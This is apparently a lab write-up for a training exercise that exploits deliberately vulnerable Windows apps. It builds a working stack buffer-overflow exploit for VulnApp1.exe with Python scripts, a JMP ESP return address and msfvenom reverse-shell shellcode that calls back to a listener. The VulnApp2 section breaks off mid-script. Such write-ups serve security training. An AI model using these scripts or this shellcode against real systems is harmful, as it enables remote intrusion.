11.2.10.2 - Extra Mile

# 11.2.10.2 - Extra Mile
In the Tools folder of your Windows VM, there are three applications called VulnApp1.exe, VulnApp2.exe, and VulnApp3.exe, each containing a vulnerability. Associated Python proof of concept scripts are also present in the folder. Using the PoCs, write exploits for each of the vulnerable applications.

# VulnApp1.exe

## Crash the app. 
We can crash the app with the original script. We change the IP to the Windows client IP 192.168.214.10, and convert the buffer value to use decimal.
![ba6320bd185ef62f55763a7fd84c21ff.png](af9552d94de648cd944169c23eebd6b6.png)
Here is the script:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 1_poc.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "A" * 2560
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

## Determine the offset
Replace the buffer with output from msf-pattern_create
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ msf-pattern_create -l 2560
```

Here is the script:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 3_determineOffset.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2D"

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes at EIP33794332
![854995fbddcca0da86bf37722cc8f40b.png](d0d4b506325b41e9be5e9ec278a036b1.png)


## Verify the offset
Run msf-pattern_offset. The offset is at 2288
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/syncbreeze$ msf-pattern_offset -l 2560 -q 33794332
[*] Exact match at offset 2288 
```
Modify the poc to account for the offset. Here it is:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 4_verifyOffset.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  #  msf-pattern_offset -l 2560 -q 33794332
  filler    = "A" * 2288
  eip       = "B" * 4
  buffer    = "C" * (2560 - len(filler) - len(eip))

  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes at EIP 42424242.
![2494b2f226750d45cdf7f464a07fb10d.png](583fb61886ce4c46b9a0a6cede871ba4.png)

Take note that ESP lands at 03DEEE6C
![86c9e5b8e75240c83fb942b00519d6c3.png](b5650f74d55e4a9398fcf821a4dc7404.png)


## Find a place for shellcode
We will try using the technique of simply increasing the buffer. Let's increase it by an extra 500 bytes. Here is the code:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 5_placeholder_for_shellcode.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "B" * 4
  offset    = "C" * 8   # ESP lands at 03DEEE6C
  buffer    = "D" * (3060 - len(filler) - len(eip) - len(offset))

  inputBuffer = filler + eip + offset + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes with EIP 42424242 and ESP 03CAEE6C (beginning of shellcode placeholder)
![0e0951b45c66c40001867d624af787a9.png](550529fd0ba849b9a14f318af0b4cc07.png)

## Find the bad characters
Here is the script with \x00 already taken out (it is a known bad character):
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 6_check_bad_chars.py 
#!/usr/bin/python
import socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "B" * 4
  offset    = "C" * 8   # ESP lands at 03DEEE6C

  inputBuffer = filler + eip + offset + badchars

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes with EIP 42424242. ESP is 03CEEE6C
![aea3ea7ee01f86f5cb3ffaeb08569507.png](be490a12294945c89e9c76678ce60a9a.png)

Follow in Dump ESP 03CEEE6C. We see that the only bad character is \x00.
![2500d44c904dd42c849d7587e94b8680.png](1d4559cc32f94830b1860cafe1532112.png)


## Find a return address

The output from running `!mona modules`. We see VulnApp1.exe runs with Rebase, SafeSEH, ASLR, and NXCompat disabled, and OS Dll enabled. No other modules have the same features disabled. However, we do know that VulnApp1.exe address range does not contain bad characters (loads at \x14800000)
![bf509044745f494355bf17b6b2b82386.png](ea13eddbc80947da9e740e47863a5775.png)

Determine the opcode equivalent of JMP ESP using msf-nasm_shell.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ msf-nasm_shell 
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 
```

Search for the hex represention of the opcode (0xFFE4) in all sections of VulnApp1.exe with mona.py find. This is the string to input: `!mona find -s "\xff\xe4" -m "VulnApp1.exe"`
![4211c3c9ac1f0d8462802d3d7cbfc5ce.png](de4b26a34a224245b4206566492b6428.png)

We see that 1 pointer was found at \x148010cf, and this address does not contain any bad characters.
![fc2f53b1c247fc08cd00e0f10e40e927.png](3dd68b8bcb22461cb31f8e9303cde167.png)

We "Go to address in Disassembler" and see that it does contain the JMP ESP instruction.
![be253ee28a30a04f376c1c1dc835b0f6.png](2f75d30b87dc46f1bf0700d0bd7211cd.png)

Update our poc to use EIP \x148010cf
```
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1```python
$ cat 7_eip_jmp_esp.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "\xcf\x10\x80\x14" # \x148010cf
  offset    = "C" * 8   # ESP lands at 03DEEE6C
  buffer    = "D" * (3060 - len(filler) - len(eip) - len(offset))

  inputBuffer = filler + eip + offset + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Place a breakpoint on \x148010cf
![d45b3510ec56e6b72c580e8d15714f6d.png](2f5c639d26d94ce5b6df0ba5b52ef0d4.png)

Run the exploit. We see we reached the breakpoint
![06c8650d144b489d4c3fdde644d5b2e4.png](d59a1a62f1054c1d8f07f4e43ffafc4b.png)

Press F7 to single-step into our shellcode placeholder which is currently a bunch of D's.
![ee3ef6a8c2fa297440de2c740a623263.png](e0b44fef176f4bf2ac3668b6c1e5ac30.png)

## Generate the shellcode payload
Use msfvenom
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xd9\xce\xd9\x74\x24\xf4\xbb\xfb\x41\xe4\x34\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x11\xbd\x06\xc1\x19\xd6\x45"
"\x2a\xe1\x27\x2a\xa2\x04\x16\x6a\xd0\x4d\x09\x5a\x92\x03\xa6"
"\x11\xf6\xb7\x3d\x57\xdf\xb8\xf6\xd2\x39\xf7\x07\x4e\x79\x96"
"\x8b\x8d\xae\x78\xb5\x5d\xa3\x79\xf2\x80\x4e\x2b\xab\xcf\xfd"
"\xdb\xd8\x9a\x3d\x50\x92\x0b\x46\x85\x63\x2d\x67\x18\xff\x74"
"\xa7\x9b\x2c\x0d\xee\x83\x31\x28\xb8\x38\x81\xc6\x3b\xe8\xdb"
"\x27\x97\xd5\xd3\xd5\xe9\x12\xd3\x05\x9c\x6a\x27\xbb\xa7\xa9"
"\x55\x67\x2d\x29\xfd\xec\x95\x95\xff\x21\x43\x5e\xf3\x8e\x07"
"\x38\x10\x10\xcb\x33\x2c\x99\xea\x93\xa4\xd9\xc8\x37\xec\xba"
"\x71\x6e\x48\x6c\x8d\x70\x33\xd1\x2b\xfb\xde\x06\x46\xa6\xb6"
"\xeb\x6b\x58\x47\x64\xfb\x2b\x75\x2b\x57\xa3\x35\xa4\x71\x34"
"\x39\x9f\xc6\xaa\xc4\x20\x37\xe3\x02\x74\x67\x9b\xa3\xf5\xec"
"\x5b\x4b\x20\xa2\x0b\xe3\x9b\x03\xfb\x43\x4c\xec\x11\x4c\xb3"
"\x0c\x1a\x86\xdc\xa7\xe1\x41\x23\x9f\x9e\x47\xcb\xe2\x60\x69"
"\xb7\x6a\x86\x03\xd7\x3a\x11\xbc\x4e\x67\xe9\x5d\x8e\xbd\x94"
"\x5e\x04\x32\x69\x10\xed\x3f\x79\xc5\x1d\x0a\x23\x40\x21\xa0"
"\x4b\x0e\xb0\x2f\x8b\x59\xa9\xe7\xdc\x0e\x1f\xfe\x88\xa2\x06"
"\xa8\xae\x3e\xde\x93\x6a\xe5\x23\x1d\x73\x68\x1f\x39\x63\xb4"
"\xa0\x05\xd7\x68\xf7\xd3\x81\xce\xa1\x95\x7b\x99\x1e\x7c\xeb"
"\x5c\x6d\xbf\x6d\x61\xb8\x49\x91\xd0\x15\x0c\xae\xdd\xf1\x98"
"\xd7\x03\x62\x66\x02\x80\x92\x2d\x0e\xa1\x3a\xe8\xdb\xf3\x26"
"\x0b\x36\x37\x5f\x88\xb2\xc8\xa4\x90\xb7\xcd\xe1\x16\x24\xbc"
"\x7a\xf3\x4a\x13\x7a\xd6";
```

Update our poc with the shellcode and include 16 bytes of NOPs"
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 8_add_shellcode_yes_nops.py 
#!/usr/bin/python
import socket

shellcode = ("\xd9\xce\xd9\x74\x24\xf4\xbb\xfb\x41\xe4\x34\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x11\xbd\x06\xc1\x19\xd6\x45"
"\x2a\xe1\x27\x2a\xa2\x04\x16\x6a\xd0\x4d\x09\x5a\x92\x03\xa6"
"\x11\xf6\xb7\x3d\x57\xdf\xb8\xf6\xd2\x39\xf7\x07\x4e\x79\x96"
"\x8b\x8d\xae\x78\xb5\x5d\xa3\x79\xf2\x80\x4e\x2b\xab\xcf\xfd"
"\xdb\xd8\x9a\x3d\x50\x92\x0b\x46\x85\x63\x2d\x67\x18\xff\x74"
"\xa7\x9b\x2c\x0d\xee\x83\x31\x28\xb8\x38\x81\xc6\x3b\xe8\xdb"
"\x27\x97\xd5\xd3\xd5\xe9\x12\xd3\x05\x9c\x6a\x27\xbb\xa7\xa9"
"\x55\x67\x2d\x29\xfd\xec\x95\x95\xff\x21\x43\x5e\xf3\x8e\x07"
"\x38\x10\x10\xcb\x33\x2c\x99\xea\x93\xa4\xd9\xc8\x37\xec\xba"
"\x71\x6e\x48\x6c\x8d\x70\x33\xd1\x2b\xfb\xde\x06\x46\xa6\xb6"
"\xeb\x6b\x58\x47\x64\xfb\x2b\x75\x2b\x57\xa3\x35\xa4\x71\x34"
"\x39\x9f\xc6\xaa\xc4\x20\x37\xe3\x02\x74\x67\x9b\xa3\xf5\xec"
"\x5b\x4b\x20\xa2\x0b\xe3\x9b\x03\xfb\x43\x4c\xec\x11\x4c\xb3"
"\x0c\x1a\x86\xdc\xa7\xe1\x41\x23\x9f\x9e\x47\xcb\xe2\x60\x69"
"\xb7\x6a\x86\x03\xd7\x3a\x11\xbc\x4e\x67\xe9\x5d\x8e\xbd\x94"
"\x5e\x04\x32\x69\x10\xed\x3f\x79\xc5\x1d\x0a\x23\x40\x21\xa0"
"\x4b\x0e\xb0\x2f\x8b\x59\xa9\xe7\xdc\x0e\x1f\xfe\x88\xa2\x06"
"\xa8\xae\x3e\xde\x93\x6a\xe5\x23\x1d\x73\x68\x1f\x39\x63\xb4"
"\xa0\x05\xd7\x68\xf7\xd3\x81\xce\xa1\x95\x7b\x99\x1e\x7c\xeb"
"\x5c\x6d\xbf\x6d\x61\xb8\x49\x91\xd0\x15\x0c\xae\xdd\xf1\x98"
"\xd7\x03\x62\x66\x02\x80\x92\x2d\x0e\xa1\x3a\xe8\xdb\xf3\x26"
"\x0b\x36\x37\x5f\x88\xb2\xc8\xa4\x90\xb7\xcd\xe1\x16\x24\xbc"
"\x7a\xf3\x4a\x13\x7a\xd6")

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "\xcf\x10\x80\x14" # \x148010cf
  offset    = "C" * 8
  nops      = "\x90" * 16

  inputBuffer = filler + eip + offset + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Open a netcat listener on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
```

Run the exploit again (remove the JMP ESP breakpoint). Notice we now have shell on the Kali listener
![a5d7fafea0ed00fb370e40ea251f0006.png](80e3407ab8844e7b8941deb97dc3a05d.png)

We see on TCP View that the exploit did not crash the app. There is no further need to improve the exploit.
![989cc3f901f57e26e74cc6bfbcfc748a.png](9113b8938569435c8bc3169c2003d41f.png)




# VulnApp2.exe

## The original poc.py
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat vuln2_Poc.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "A" * 0x830

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.176.227", 7002))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

## Replicate the crash
Change the IP to our Windows Client IP
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 1_poc.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "A" * 0x830

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Run the exploit. We see it crashed with EIP 41414141
![0b09d811b18ac822a1a29fc7f5c99183.png](b8238608cd114ade92eef747df2aa2bd.png)

## Find the offset
Convert the hex value 0x830 to decimal 2096 and replace the buffer value with it. Then create a unique string pattern of length 2096 using msf-pattern_create. The resultant unique string will be used in the poc script.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ msf-pattern_create -l 2096
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr
```

The updated script using the unique string
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln2$ cat 2_determine_offset.py 
#!/usr/bin/python
import socket

